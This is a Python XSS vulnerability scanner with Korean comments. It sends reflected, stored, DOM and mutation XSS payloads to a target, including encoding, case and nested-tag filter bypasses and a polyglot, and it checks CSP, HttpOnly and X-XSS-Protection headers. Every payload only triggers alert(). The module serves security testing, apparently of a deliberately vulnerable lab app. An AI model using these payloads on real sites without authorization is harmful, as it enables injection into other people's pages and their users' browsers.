"""
Cross-Site Scripting (XSS)
Reflected XSS, Stored XSS, DOM-based XSS, Mutation XSS
"""
import requests
from urllib.parse import quote
import re

def scan(target_url):
    result = {
        'name': 'Cross-Site Scripting (XSS)',
        'category': 'Injection',
        'status': 'SAFE',
        'severity': 'HIGH',
        'vulnerabilities': [],
        'recommendation': 'HTML 엔티티 인코딩, CSP 헤더, HttpOnly 쿠키, input sanitization',
        'details': ''
    }
    
    details = []
    
    # XSS 페이로드 (다양한 우회 기법)
    xss_payloads = [
        # 기본 스크립트 태그
        ("<script>alert('XSS')</script>", "Basic Script", "script"),
        ("<script>alert(1)</script>", "Simple Alert", "script"),
        ("<script>alert(document.domain)</script>", "Domain Alert", "script"),
        
        # 이벤트 핸들러
        ("<img src=x onerror=alert('XSS')>", "IMG onerror", "img"),
        ("<svg onload=alert('XSS')>", "SVG onload", "svg"),
        ("<body onload=alert('XSS')>", "Body onload", "body"),
        ("<iframe onload=alert('XSS')>", "Iframe onload", "iframe"),
        ("<input autofocus onfocus=alert('XSS')>", "Input onfocus", "input"),
        ("<select autofocus onfocus=alert('XSS')>", "Select onfocus", "select"),
        ("<textarea autofocus onfocus=alert('XSS')>", "Textarea onfocus", "textarea"),
        ("<marquee onstart=alert('XSS')>", "Marquee onstart", "marquee"),
        
        # HTML5 이벤트
        ("<video><source onerror=alert('XSS')>", "Video source", "video"),
        ("<audio src=x onerror=alert('XSS')>", "Audio onerror", "audio"),
        
        # JavaScript URI
        ("<a href=javascript:alert('XSS')>Click</a>", "Javascript URI", "href"),
        ("<iframe src=javascript:alert('XSS')>", "Iframe Javascript", "iframe"),
        
        # 인코딩 우회
        ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>", "HTML Entity", "encoding"),
        ("<img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>", "Unicode", "encoding"),
        ("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", "Base64", "encoding"),
        
        # 대소문자 우회
        ("<ScRiPt>alert('XSS')</ScRiPt>", "Mixed Case", "case"),
        ("<sCrIpT>alert('XSS')</sCrIpT>", "Random Case", "case"),
        
        # 태그 우회
        ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Nested Tags", "bypass"),
        ("<<SCRIPT>alert('XSS');//<</SCRIPT>", "Double Tags", "bypass"),
        
        # 필터 우회
        ("<script>alert(String.fromCharCode(88,83,83))</script>", "CharCode", "bypass"),
        ("<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "Eval CharCode", "bypass"),
        
        # No quotes
        ("<script>alert(document.domain)</script>", "No Quotes", "noquote"),
        ("<img src=x onerror=alert(1)>", "No Quotes IMG", "noquote"),
        
        # SVG
        ("<svg><script>alert('XSS')</script></svg>", "SVG Script", "svg"),
        ("<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>", "SVG Animate", "svg"),
        
        # Polyglot
        ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>//", "Polyglot", "complex"),
        
        # Template literals (ES6)
        ("<script>alert`XSS`</script>", "Template Literal", "es6"),
        
        # HTML Entities
        ("&lt;script&gt;alert('XSS')&lt;/script&gt;", "HTML Entity Script", "entity"),
    ]
    
    # 1. Reflected XSS (검색 기능)
    details.append("[XSS-1] Reflected XSS 테스트")
    
    search_endpoints = [
        f"{target_url}/api/boards",
        f"{target_url}/api/employees",
        f"{target_url}/search",
    ]
    
    param_names = ['search', 'q', 'query', 'keyword', 'term', 'name']
    
    for endpoint in search_endpoints:
        for payload, payload_name, _ in xss_payloads:
            for param_name in param_names:
                try:
                    params = {param_name: payload}
                    headers = {'X-Security-Mode': 'vulnerable'}
                    
                    resp = requests.get(endpoint, params=params, headers=headers, timeout=5)
                    
                    # 페이로드가 인코딩 없이 반사되는지 확인
                    if payload in resp.text:
                        result['vulnerabilities'].append(f"Reflected XSS: {endpoint}?{param_name}={payload_name}")
                        details.append(f"  ✗ {payload_name} 반사됨")
                        result['status'] = 'VULNERABLE'
                        break
                    
                    # 부분적으로 반사되는 경우
                    elif 'alert' in resp.text and 'XSS' in resp.text:
                        result['vulnerabilities'].append(f"Potential Reflected XSS: {payload_name}")
                        details.append(f"  ⚠ {payload_name} 부분 반사")
                        
                except:
                    pass
                
                if result['status'] == 'VULNERABLE':
                    break
                    
            if result['status'] == 'VULNERABLE':
                break
                
        if result['status'] == 'VULNERABLE':
            break
    
    # 2. Stored XSS (게시판)
    details.append("\n[XSS-2] Stored XSS 테스트")
    
    try:
        create_url = f"{target_url}/api/boards"
        
        stored_payloads = [
            ("<script>alert('Stored XSS')</script>", "제목", "Script in Title"),
            ("<img src=x onerror=alert('Stored')>", "내용", "IMG in Content"),
            ("<svg onload=alert('Stored')>", "내용", "SVG in Content"),
        ]
        
        for payload, location, payload_name in stored_payloads:
            try:
                if location == "제목":
                    data = {
                        'title': payload,
                        'content': 'Test content',
                        'category': 'GENERAL'
                    }
                else:
                    data = {
                        'title': 'Test title',
                        'content': payload,
                        'category': 'GENERAL'
                    }
                
                headers = {
                    'X-Security-Mode': 'vulnerable',
                    'Content-Type': 'application/json'
                }
                
                # 게시글 작성
                resp_create = requests.post(create_url, json=data, headers=headers, timeout=5)
                
                if resp_create.status_code in [200, 201]:
                    # 게시글 목록 조회
                    resp_list = requests.get(create_url, headers=headers, timeout=5)
                    
                    # 저장된 페이로드가 그대로 출력되는지 확인
                    if payload in resp_list.text:
                        result['vulnerabilities'].append(f"Stored XSS: {payload_name}")
                        details.append(f"  ✗ {payload_name} - 게시판에 저장됨")
                        result['status'] = 'VULNERABLE'
                        break
                        
            except:
                pass
                
    except:
        details.append("  • Stored XSS 테스트 실패")
    
    # 3. DOM-based XSS
    details.append("\n[XSS-3] DOM-based XSS 테스트")
    
    try:
        # JavaScript에서 location.hash를 직접 사용하는 경우
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#<img src=x onerror=alert('DOM')>",
        ]
        
        for payload in dom_payloads:
            try:
                url = f"{target_url}/{payload}"
                resp = requests.get(url, timeout=5)
                
                # JavaScript 코드에서 위험한 패턴 확인
                dangerous_patterns = [
                    r'location\.hash',
                    r'window\.location\.hash',
                    r'document\.URL',
                    r'document\.documentURI',
                    r'document\.baseURI',
                    r'innerHTML\s*=',
                    r'outerHTML\s*=',
                    r'document\.write\(',
                    r'eval\(',
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, resp.text):
                        result['vulnerabilities'].append(f"DOM-based XSS 가능성: {pattern}")
                        details.append(f"  ⚠ 위험 패턴 발견: {pattern}")
                        result['status'] = 'VULNERABLE'
                        break
                        
            except:
                pass
                
    except:
        details.append("  • DOM-based XSS 테스트 실패")
    
    # 4. CSP (Content Security Policy) 확인
    details.append("\n[XSS-4] CSP 헤더 확인")
    
    try:
        resp = requests.get(target_url, timeout=5)
        
        if 'Content-Security-Policy' not in resp.headers:
            result['vulnerabilities'].append("CSP 헤더 미설정")
            details.append("  ✗ Content-Security-Policy 헤더 없음")
            result['status'] = 'VULNERABLE'
        else:
            csp = resp.headers['Content-Security-Policy']
            details.append(f"  ✓ CSP 설정됨")
            
            # 약한 CSP 정책 확인
            weak_directives = [
                ('unsafe-inline', "인라인 스크립트 허용"),
                ('unsafe-eval', "eval() 허용"),
                ("*", "모든 소스 허용"),
                ("data:", "data: URI 허용"),
            ]
            
            for directive, desc in weak_directives:
                if directive in csp:
                    result['vulnerabilities'].append(f"약한 CSP: {desc}")
                    details.append(f"  ⚠ {desc}")
                    result['status'] = 'VULNERABLE'
                    
    except:
        details.append("  • CSP 확인 실패")
    
    # 5. HttpOnly 쿠키 확인
    details.append("\n[XSS-5] HttpOnly 쿠키 확인")
    
    try:
        resp = requests.get(target_url, timeout=5)
        
        if 'Set-Cookie' in resp.headers:
            cookies = resp.headers['Set-Cookie']
            
            if 'HttpOnly' not in cookies:
                result['vulnerabilities'].append("HttpOnly 플래그 없음")
                details.append("  ✗ 쿠키에 HttpOnly 플래그 없음 (XSS로 탈취 가능)")
                result['status'] = 'VULNERABLE'
            else:
                details.append("  ✓ HttpOnly 쿠키 설정됨")
                
    except:
        details.append("  • 쿠키 확인 실패")
    
    # 6. Mutation XSS (mXSS)
    details.append("\n[XSS-6] Mutation XSS 테스트")
    
    try:
        mutation_payloads = [
            ("<noscript><p title=\"</noscript><img src=x onerror=alert('mXSS')>\">", "noscript mXSS"),
            ("<svg><style><img src=x onerror=alert('mXSS')></style>", "svg style mXSS"),
            ("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('mXSS')>", "math mXSS"),
        ]
        
        for payload, name in mutation_payloads:
            params = {'search': payload}
            resp = requests.get(f"{target_url}/api/boards", params=params, timeout=5)
            
            # Mutation이 발생했는지 확인하기 어려우므로 반사 여부만 확인
            if payload in resp.text:
                result['vulnerabilities'].append(f"Potential mXSS: {name}")
                details.append(f"  ⚠ {name} 반사됨")
                
    except:
        details.append("  • Mutation XSS 테스트 실패")
    
    # 7. JavaScript URL Scheme
    details.append("\n[XSS-7] JavaScript URL Scheme")
    
    try:
        # href, src 등에서 javascript: 사용 가능 여부
        js_url_tests = [
            "javascript:alert('XSS')",
            "javascript:void(alert('XSS'))",
            "javascript:eval('alert(1)')",
        ]
        
        for payload in js_url_tests:
            # a 태그의 href에 삽입 가능한지 확인
            params = {'url': payload, 'link': payload}
            resp = requests.get(target_url, params=params, timeout=5)
            
            if f'href="{payload}"' in resp.text or f"href='{payload}'" in resp.text:
                result['vulnerabilities'].append("JavaScript URL Scheme 허용")
                details.append(f"  ✗ javascript: URL 필터링 안 됨")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • JavaScript URL 테스트 실패")
    
    # 8. X-XSS-Protection 헤더 확인
    details.append("\n[XSS-8] X-XSS-Protection 헤더")
    
    try:
        resp = requests.get(target_url, timeout=5)
        
        if 'X-XSS-Protection' in resp.headers:
            xss_protection = resp.headers['X-XSS-Protection']
            
            if xss_protection == '0':
                result['vulnerabilities'].append("XSS Protection 비활성화")
                details.append(f"  ⚠ X-XSS-Protection: 0 (보호 비활성화)")
            else:
                details.append(f"  ✓ X-XSS-Protection: {xss_protection}")
        else:
            details.append("  • X-XSS-Protection 헤더 없음 (CSP 권장)")
            
    except:
        pass
    
    if result['status'] == 'SAFE':
        details.append("\n✓ XSS 방어가 잘 되어 있습니다")
    
    result['details'] = '\n'.join(details)
    return result